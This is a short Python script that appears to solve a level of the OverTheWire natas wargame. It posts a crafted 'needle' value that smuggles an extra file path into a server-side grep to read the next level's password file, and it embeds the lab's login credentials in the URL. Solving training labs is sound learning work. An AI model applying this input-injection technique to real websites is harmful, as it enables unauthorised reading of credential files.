import requests

target = 'http://natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu@natas10.natas.labs.overthewire.org'
payload = {'needle':'.* /etc/natas_webpass/natas11 #','submit':'Submit'}

r = requests.post(target,data=payload)
if r.status_code != requests.codes.ok :
	print 'Unable to connect'
else :
	print 'Connected'

print r.text